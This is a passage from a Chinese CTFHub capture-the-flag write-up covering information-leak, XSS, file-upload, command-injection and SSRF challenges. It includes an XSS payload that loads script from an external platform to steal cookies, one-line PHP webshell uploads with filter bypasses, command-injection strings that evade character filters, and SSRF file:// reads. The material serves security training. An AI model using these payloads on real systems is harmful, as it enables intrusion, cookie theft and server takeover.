<h2 id="2-信息泄露-备份文件下载"><a href="#2-信息泄露-备份文件下载" class="headerlink" title="2.信息泄露-备份文件下载"></a>2.信息泄露-备份文件下载</h2><p><img src="/2022/07/27/CTFHub-wp/image-20220919213733369.png" alt="image-20220919213733369"></p>
<h2 id="2-1-信息泄露-robots-txt"><a href="#2-1-信息泄露-robots-txt" class="headerlink" title="2.1 信息泄露-robots.txt"></a>2.1 信息泄露-robots.txt</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">访问url/robots.txt</span><br></pre></td></tr></table></figure></div>

<p>查看爬虫协议</p>
<h2 id="2-2-信息泄露-bak文件"><a href="#2-2-信息泄露-bak文件" class="headerlink" title="2.2 信息泄露-bak文件"></a>2.2 信息泄露-bak文件</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">访问url/文件名.后缀名<span class="string">.bak</span></span><br></pre></td></tr></table></figure>

<p>下载bak（备份文件）</p>
<h2 id="2-3-信息泄露-vim缓存"><a href="#2-3-信息泄露-vim缓存" class="headerlink" title="2.3 信息泄露-vim缓存"></a>2.3 信息泄露-vim缓存</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
<p>以 index.php 为例：<br><strong>第一次</strong>产生的交换文件名为 <code>.index.php.swp</code></p>
<p><strong>再次意外退出</strong>后，将会产生名为 <code>.index.php.swo</code> 的交换文件</p>
<p><strong>第三次产生</strong>的交换文件则为 <code>.index.php.swn</code><br>作用</p>
<p><u>可用来恢复意外退出的文件</u></p>
<h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p><code>SWP</code>文件为隐藏文件，操作时需要在文件名前加.</p>
<p>针对<code>SWP</code>备份文件，我们可以使用<code>vim -r filename</code>命令来恢复文件<br>(<code>vim</code>使用的缓存存储为一种固定格式的二进制文件。而我们一般编辑的时明问可见字符，在vim的缓存中这些可见字符会原样保留,所以显示是一种乱码)<br>根据提示按回车进行恢复</p>
<h2 id="2-4-信息泄露-DS-Store"><a href="#2-4-信息泄露-DS-Store" class="headerlink" title="2.4 信息泄露-.DS_Store"></a>2.4 信息泄露-.DS_Store</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">.DS_Store</span> 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过<span class="string">.DS_Store</span>可以知道这个目录里面所有文件的清单。</span><br></pre></td></tr></table></figure>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">访问url/.DS_Store</span><br></pre></td></tr></table></figure></div>

<p>下载<code>DS_Store</code>文件</p>
<h2 id="3-信息泄露-Git泄露-log"><a href="#3-信息泄露-Git泄露-log" class="headerlink" title="3.信息泄露-Git泄露-log"></a>3.信息泄露-Git泄露-log</h2><p> 第一次使用<strong>githack</strong>，记录一下</p>
<p><strong>注意githack需要python2.7版本</strong></p>
<p><code>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</code></p>
<p><code>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。</code></p>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>1、解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )<br>2、去.git/objects/ 文件夹下下载对应的文件<br>3、zlib解压文件，按原始的目录结构写入源代码</p>
<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>速度快，默认20个工作线程<br>尽量还原所有的源代码，缺失的文件不影响脚本工作<br>脚本不需要执行额外的git命令，all you need is python<br>脚本无需浏览目录</p>
<h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><p>注意这里在url后面需要加上.git，用dirsearch可以扫出来（python3）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">GitHack.py http:<span class="regexp">//</span>www.openssl.org<span class="regexp">/.git/</span></span><br></pre></td></tr></table></figure></div>

<p>然后在目录dist就会生成对应目录 </p>
<p>打开目录，输入cmd，执行<code>git log</code>【git log 可以查看commit history，也就是命令执行的历史，可以看看之前执行过哪些命令，方便后面查询命令执行的具体内容】</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220728230330073.png" alt="image-20220728230330073"></p>
<p>然后复制add flag这个命令的代码，如上图<code>75272ca078b7eedcf329a2b08f6e4faae0a36a99</code></p>
<p>然后用git diff</p>
<p>【</p>
<p>git diff比较两个版本的差异，</p>
<p>这里后面只有<strong>一个命令</strong>就是比较本地工作区和缓存区的信息区别</p>
<p>如果后面有<strong>两个命令</strong>，就是比较这两个命令的差别</p>
<p>】</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220728231134513.png" alt="image-20220728231134513"></p>
<p>这里比较，就得到了flag</p>
<h2 id="4-信息泄露-Git泄露-Stash"><a href="#4-信息泄露-Git泄露-Stash" class="headerlink" title="4.信息泄露-Git泄露-Stash"></a>4.信息泄露-Git泄露-Stash</h2><h3 id="git-stash-的作用"><a href="#git-stash-的作用" class="headerlink" title="git stash 的作用"></a>git stash 的作用</h3><p>git stash用于想要保存当前的修改,但是想回到之前最后一次提交的干净的工作仓库时进行的操作.git stash将本地的修改保存起来,并且将当前代码切换到HEAD提交上.</p>
<p>通过git stash存储的修改列表,可以通过<u><strong>git stash list</strong></u>查看.<u><strong>git stash show</strong></u>用于校验,<u><strong>git stash apply</strong></u>用于重新存储.直接执行<u>git stash等同于git stash save.</u></p>
<p>最新的存储保存在<u><strong>refs/stash</strong></u>中.老的存储可以通过相关的参数获得,例如stash@{0}获取最新的存储,stash@{1}获取次新.stash@{2.hour.ago}获取两小时之前的.存储可以直接通过索引的位置来获得stash@{n}.</p>
<p>操作同<code>2.log</code></p>
<p>可以先用dirsearch扫一下， 发现<u><strong>refs/stash</strong></u>文件，</p>
<p>然后用GitHack扫描</p>
<p>在生成文件夹里有stash文件</p>
<p><code>D:\GitHack-master\dist\challenge-8d48663e236c2ebc.sandbox.ctfhub.com_10800\.git\refs</code></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729115457869.png" alt="image-20220729115457869"></p>
<p>打开看到</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729115528299.png" alt="image-20220729115528299"></p>
<p>在生成的文件夹下用</p>
<p><code>git diff d8c1978b1e71300574e1bb5335a01124b3a55569</code></p>
<p>得到flag</p>
<p>【也可以使用 git bash，直接在生成的文件夹下</p>
<p>执行git stash list </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">查看stash了哪些存储</span><br></pre></td></tr></table></figure>

<p>然后执行git stash pop</p>
<pre><code>恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，并将对应修改应用到当前的工作目录下,默认为第一个stash,即stash@&#123;0&#125;，如果要应用并删除其他stash，命令：git stash pop stash@&#123;$num&#125; ，比如应用并删除第二个：git stash pop stash@&#123;1&#125;）
</code></pre>
<p>然后会在该目录下生成一个新的txt文件，打开或用cat命令，得到flag</p>
<p>】</p>
<h2 id="5-信息泄露-SVN泄露"><a href="#5-信息泄露-SVN泄露" class="headerlink" title="5.信息泄露-SVN泄露"></a>5.信息泄露-SVN泄露</h2><p><code>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</code></p>
<p>这道题需要运用<strong>dvcs-ripper</strong>工具进行处理</p>
<p>可以先用dirsearch扫出.svn目录，说明有SVN泄露</p>
<p>和githack类似，</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/rip-svn.pl -v -u url/</span>.svn</span><br></pre></td></tr></table></figure></div>

<p>然后在dvcs-ripper目录里，进入.svn目录</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729175208298.png" alt="image-20220729175208298"></p>
<p>然后进入pristine目录，进去发现两个目录，挨个打开</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729175252045.png" alt="image-20220729175252045"></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729175429878.png" alt="image-20220729175429878"></p>
<p>发现一个目录下是网站页面源码，另一个就是flag</p>
<p>得到flag</p>
<h2 id="6-信息泄露-HG泄露"><a href="#6-信息泄露-HG泄露" class="headerlink" title="6.信息泄露-HG泄露"></a>6.信息泄露-HG泄露</h2><p><code>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</code></p>
<p>可以先用dirsearch扫出.hg目录，说明有HG泄露</p>
<p>这个和SVN一样，只不过要改成.hg</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/rip-hg.pl -v -u url/</span>.hg</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/07/27/CTFHub-wp/image-20220730164340016.png" alt="image-20220730164340016"></p>
<p>发现两个文件，猜测为HG泄露文件</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220730164428184.png" alt="image-20220730164428184"></p>
<p>发现flag文本文件</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220730164949862.png" alt="image-20220730164949862"></p>
<p>url+flag_973127138.txt</p>
<p>得到flag</p>
<h2 id="7-xss-xss反射型"><a href="#7-xss-xss反射型" class="headerlink" title="7.xss-xss反射型"></a>7.xss-xss反射型</h2><p>发现它有两个输入框</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731104635854.png" alt="image-20220731104635854"></p>
<p>第一个输入测试语句，成功弹窗</p>
<p>第二个是发送url，盲猜是发到后台</p>
<p>看了一些wp，发现需要使用xss测试平台<code>http://xsscom.com//index.php</code></p>
<p>先创建项目</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731113619175.png" alt="image-20220731113619175"></p>
<p>设置配置</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731113753893.png" alt="image-20220731113753893"></p>
<p>然后点击查看代码</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731113810045.png" alt="image-20220731113810045"></p>
<p>在最下面看到</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731113837566.png" alt="image-20220731113837566"></p>
<p>把代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xsscom.com//9VJcMV</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>输入到第一个框中</p>
<p>再把提交后的url复制，然后到第二框中发送</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731114028909.png" alt="image-20220731114028909"></p>
<p>然后返回xss测试平台上查看</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731114142138.png" alt="image-20220731114142138"></p>
<p>cookie处出现flag</p>
<h2 id="8-文件上传-文件头检查"><a href="#8-文件上传-文件头检查" class="headerlink" title="8.文件上传-文件头检查"></a>8.文件上传-文件头检查</h2><p><code>文件头是直接位于文件中的一段数据,是文件的一部分</code></p>
<p>这里过滤文件头，而且限制图片类型文件，所以可以试试上传一个没有任何问题的图片【注意图片不能太大，不然会最后用蚁剑连接会爆错，我上传1mb大小图片就报错，最后上传400字节图片才成功】</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731164210465.png" alt="image-20220731164210465"></p>
<p>上传图片后，在后面加上一句话木马，并修改文件名</p>
<p><strong>【也可以用cmd 合成图片马，也是有图片文件头】</strong></p>
<p><strong>【copy 图片名.png(.jpg)/b + 木马文件名.php(.asp/.aspx)/a 生成图片名.png(.jpg)】</strong></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731164732820.png" alt="image-20220731164732820"></p>
<p>【已试可行】</p>
<p>然后正常用蚁剑连接</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731164330254.png" alt="image-20220731164330254"></p>
<p>得到flag</p>
<h2 id="9-文件上传-00截断"><a href="#9-文件上传-00截断" class="headerlink" title="9.文件上传-00截断"></a>9.文件上传-00截断</h2><h3 id="0x00截断原理：-php-lt-5-3-29"><a href="#0x00截断原理：-php-lt-5-3-29" class="headerlink" title="0x00截断原理：[php&lt;5.3.29]"></a>0x00截断原理：[php&lt;5.3.29]</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COS"><figure class="iseeu highlight /cos"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>x00是十六进制表示方法，是<span class="keyword">ascii</span>码为<span class="number">0</span>的字符，在有些函数处理时，会把这个字符当做结束符。系统在对文件名的读取时，如果遇到<span class="number">0</span>x00，就会认为读取已结束。这个可以用在对文件类型名的绕过上。</span><br><span class="line"></span><br><span class="line">但要注意是文件的<span class="number">16</span>进制内容里的<span class="number">00</span>，而不是文件名中的<span class="number">00</span> ！！！就是说系统是按<span class="number">16</span>进制读取文件（或者说二进制），</span><br><span class="line"></span><br><span class="line">遇到<span class="keyword">ascii</span>码为零的位置就停止，而这个<span class="keyword">ascii</span>码为零的位置在<span class="number">16</span>进制中是<span class="number">00</span>，用<span class="number">0</span><span class="keyword">x</span>开头表示<span class="number">16</span>进制，也就是所说的<span class="number">0</span>x00截断。</span><br><span class="line"></span><br><span class="line">%<span class="number">00</span>是被服务器解码为<span class="number">0</span>x00发挥了截断作用。</span><br></pre></td></tr></table></figure></div>

<p><code>举个例子，url中输入的是upload/post.php%00.png，看样子是图片文件，那么后台读取到是upload/post.php，就实现了绕后目的。</code></p>
<p>我们开始先上传一个文件试试，限制jpg,png,gif后缀</p>
<p>上传成功后，没有显示上传路径，只是url变化</p>
<p><code>http://challenge-6cc6a23c8f284d6b.sandbox.ctfhub.com:10800/?road=/var/www/html</code></p>
<p> 猜想多半重新临时文件名，不固定，导致显示不了路径</p>
<p>这里就需要00截断，要把文件上传的路径，找到，好用蚁剑连接</p>
<p>先要清楚%00截断点在哪里，我们先F12看</p>
<p>看网站源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub 文件上传 - 00截断<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub 文件上传 - 00截断<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">?road</span>=<span class="string">/var/www/html/upload/</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span></span><br><span class="line"><span class="comment">    $info = pathinfo($name);</span></span><br><span class="line"><span class="comment">    $ext = $info[&#x27;extension&#x27;];</span></span><br><span class="line"><span class="comment">    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);</span></span><br><span class="line"><span class="comment">    if (in_array($ext, $whitelist)) &#123;</span></span><br><span class="line"><span class="comment">        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</span></span><br><span class="line"><span class="comment">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125; else &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        echo &quot;文件类型不匹配&quot;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>发现里面有一串代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="variable">$info</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>) . <span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$des</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件类型不匹配&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$des)</code>这个函数就是把上传文件放到<code>$des</code>的路径上并且改了文件名</p>
<p>所以我们不能让后面的<code>rand()</code>和<code>date()</code>运行，所以对于变量<code>road</code>【也就是开始讲到的】，就需要在它后面加上一个%00截断后面的语句</p>
<p>也就是下面这个</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731233456720.png" alt="image-20220731233456720"></p>
<p>图片正常上传就可以，这就是把图片内容上传到1.php文件中，这样虽然我们上传的是一个图片，但实际上，我们上传了一个名为1.php的一句话木马</p>
<p>【名字不重要，虽然图片和php文件名一样，这里1.php是随便取得，主要蚁剑连接的就是它】</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731233716114.png"></p>
<p>用蚁剑连接<code>url/upload/1.php</code></p>
<p>得到flag</p>
<h2 id="10-文件上传-双写后缀"><a href="#10-文件上传-双写后缀" class="headerlink" title="10.文件上传-双写后缀"></a>10.文件上传-双写后缀</h2><p>进行了一次过滤php后缀名，双写php为p<u>php</u>hp，这样当过滤了__的php，剩下的仍然是php，正常用蚁剑连接</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731165549883.png" alt="image-20220731165549883"></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731165841829.png" alt="image-20220731165841829"></p>
<p>得到flag</p>
<h2 id="11-RCE-命令注入-综合训练"><a href="#11-RCE-命令注入-综合训练" class="headerlink" title="11.RCE-命令注入-综合训练"></a>11.RCE-命令注入-综合训练</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这道题</p>
<p>看到|，;，&amp;都被过滤了</p>
<p>那么可以用%0a也是换行符代替</p>
<p>空格，/，cat，flag，ctfhub（没关系）</p>
<p>$IFS代替空格，cat可以用more代替，%09代替TAB键，用来补全flag</p>
<p><code>?ip=120.0.0.1%0als</code></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220801215911504.png" alt="image-20220801215911504"></p>
<p>然后</p>
<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0als</code></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220801215930160.png" alt="image-20220801215930160"></p>
<p>后面就简单了</p>
<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0amore$IFS%09*24135173615424.php</code></p>
<p>右键查看源码</p>
<p>得到flag</p>
<h2 id="12-SSRF-内网访问"><a href="#12-SSRF-内网访问" class="headerlink" title="12.SSRF-内网访问"></a>12.SSRF-内网访问</h2><p><img src="/2022/07/27/CTFHub-wp/image-20220802103546644.png" alt="image-20220802103546644"></p>
<p><img src="/2022/07/27/CTFHub-wp/.%5CCTFHub-wp%5Cimage-20220802103603770.png" alt="image-20220802103603770"></p>
<p>所以构造payload</p>
<p><code>http://challenge-c0c40a8ea91b3909.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</code></p>
<p>得到flag</p>
<h2 id="13-SSRF-伪协议读取文件"><a href="#13-SSRF-伪协议读取文件" class="headerlink" title="13.SSRF-伪协议读取文件"></a>13.SSRF-伪协议读取文件</h2><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>事实上是其支持的协议与封装协议。而其支持的部分协议有：</p>
<pre><code>    file:// — 访问本地文件系统

    http:// — 访问 HTTP(s) 网址

    ftp:// — 访问 FTP(s) URLs

    php:// — 访问各个输入/输出流(I/O streams)
</code></pre>
<p>根据提示，flag在Web目录下，Web目录一般是在<code>/var/www/html/</code>下</p>
<p><code>http://challenge-5c45d983b45e22b7.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</code></p>
<p>得到flag</p>
<h2 id="14-SSRF-端口扫描"><a href="#14-SSRF-端口扫描" class="headerlink" title="14.SSRF-端口扫描"></a>14.SSRF-端口扫描</h2><p>端口扫描，那就利用爆破，从8000到9000扫一遍，看看flag在哪个端口下</p>
<p><code>http://challenge-30d6aa92f511ee1f.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000</code></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220802105640721.png" alt="image-20220802105640721"></p>
<p>看到长度不同，打开查看响应数据包</p>
<p>得到flag</p>
<h2 id="15-SSRF-POST请求"><a href="#15-SSRF-POST请求" class="headerlink" title="15.SSRF-POST请求"></a>15.SSRF-POST请求</h2><p><code>hint：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</code></p>
<p>开始是一个空白页面</p>
<p>网站为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span>/?url=_</span><br></pre></td></tr></table></figure></div>

<p>我们在其后面加上<code>127.0.0.1/flag.php</code>看看能不能直接访问该文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span><span class="regexp">/?url=127.0.0.1/</span>flag.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/07/27/CTFHub-wp/image-20220925221703912.png" alt="image-20220925221703912"></p>
<p>发现出现了一个输入框</p>
<p><code>F12</code>查看源码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=11e053e2b7900523ac51fc7606b964e2--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>发现了一个<code>key</code>的参数</p>
